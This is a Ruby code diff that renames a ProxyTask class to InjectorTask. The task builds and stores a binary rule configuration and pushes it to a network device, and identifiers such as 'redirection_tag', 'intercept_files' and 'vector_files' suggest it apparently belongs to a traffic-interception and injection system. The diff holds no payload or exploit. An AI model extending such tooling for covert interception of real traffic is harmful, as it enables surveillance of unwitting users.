@@ -3,17 +3,17 @@ require_relative '../tasks'
 module RCS
 module DB
 
-class ProxyTask
+class InjectorTask
   include RCS::DB::NoFileTaskType
   include RCS::Tracer
 
   def total
-    proxy = ::Proxy.find(@params['proxy_id'])
-    proxy.rules.where(:enabled => true).count + 2
+    injector = ::Injector.find(@params['injector_id'])
+    injector.rules.where(:enabled => true).count + 2
   end
   
   def next_entry
-    proxy = ::Proxy.find(@params['proxy_id'])
+    injector = ::Injector.find(@params['injector_id'])
     
     base = rand(10)
     progressive = 0
@@ -22,9 +22,9 @@ class ProxyTask
     intercept_files = []
     vector_files = {}
 
-    proxy.rules.where(:enabled => true).each do |rule|
+    injector.rules.where(:enabled => true).each do |rule|
 
-      tag = proxy.redirection_tag + (base + progressive).to_s
+      tag = injector.redirection_tag + (base + progressive).to_s
       progressive += 1
 
       yield description "Creating rule No: #{progressive}"
@@ -125,24 +125,24 @@ class ProxyTask
       end
     end
 
-    trace :info, "Proxy config file size: " + File.size(bin_config_file).to_s
+    trace :info, "Injector config file size: " + File.size(bin_config_file).to_s
 
     # make sure to delete the old one first
-    GridFS.delete proxy[:_grid].first unless proxy[:_grid].nil?
+    GridFS.delete injector[:_grid].first unless injector[:_grid].nil?
 
     # save the binary config into the grid, it will be requested by NC later
-    proxy[:_grid] = [ GridFS.put(File.open(bin_config_file, 'rb+'){|f| f.read}, {filename: proxy[:_id].to_s}) ]
-    proxy[:_grid_size] = File.size(bin_config_file)
+    injector[:_grid] = [ GridFS.put(File.open(bin_config_file, 'rb+'){|f| f.read}, {filename: injector[:_id].to_s}) ]
+    injector[:_grid_size] = File.size(bin_config_file)
 
     # delete the temp file
     File.delete(bin_config_file)
 
-    proxy.configured = false
-    proxy.save
+    injector.configured = false
+    injector.save
 
     yield description "Creating binary config"
 
-    Frontend.rnc_push(proxy.address)
+    Frontend.rnc_push(injector.address)
     
     description "Rules applied successfully"
   end
